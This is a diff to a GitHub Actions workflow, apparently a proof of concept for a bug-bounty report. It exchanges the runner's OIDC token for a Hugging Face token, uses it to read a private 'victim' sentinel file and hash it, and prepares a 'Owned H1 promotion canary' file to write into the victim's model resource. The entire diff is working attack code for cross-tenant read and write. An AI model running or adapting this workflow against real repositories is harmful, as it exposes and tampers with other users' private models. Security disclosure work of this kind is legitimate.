@@ -2,19 +2,14 @@ name: TP Promotion Canary
 on:
   workflow_dispatch:
     inputs:
-      resource:
-        description: Victim HF model resource
-        required: true
-        type: string
-      marker:
-        description: Non-secret canary marker
-        required: true
-        type: string
+      resource: {description: Victim HF model resource, required: true, type: string}
+      marker: {description: Non-secret canary marker, required: true, type: string}
 permissions:
   contents: read
   id-token: write
 jobs:
   canary:
+    environment: protected-literal
     runs-on: ubuntu-latest
     steps:
       - name: Exchange OIDC and write canary
@@ -41,11 +36,7 @@ jobs:
           if [ "$status" != "200" ]; then cat /tmp/exchange.json; exit 1; fi
           HF_TOKEN="$(jq -er .access_token /tmp/exchange.json)"
           echo "::add-mask::$HF_TOKEN"
-          jq -c '{token_type,expires_in,issued_token_type}' /tmp/exchange.json | sed 's/^/HF_EXCHANGE=/'
-          sentinel="/tmp/sentinel"
-          curl -fsS "https://huggingface.co/${RESOURCE}/resolve/main/PRIVATE_VICTIM_SENTINEL.txt" -H "Authorization: Bearer $HF_TOKEN" -o "$sentinel"
-          sha256sum "$sentinel" | awk '{print "HF_PRIVATE_READ_SHA256=" $1}'
-          rm -f "$sentinel"
+          sentinel="/tmp/sentinel"; curl -fsS "https://huggingface.co/${RESOURCE}/resolve/main/PRIVATE_VICTIM_SENTINEL.txt" -H "Authorization: Bearer $HF_TOKEN" -o "$sentinel"; sha256sum "$sentinel" | awk '{print "HF_PRIVATE_READ_SHA256=" $1}'; rm -f "$sentinel"
           marker_b64="$(printf '%s\n' "$MARKER" | base64 -w0)"
           header="$(jq -cn --arg s "Promotion canary: $MARKER" '{key:"header",value:{summary:$s,description:"Owned H1 promotion canary"}}')"
           file="$(jq -cn --arg c "$marker_b64" '{key:"file",value:{content:$c,path:"PROMOTION_CANARY.txt",encoding:"base64"}}')"
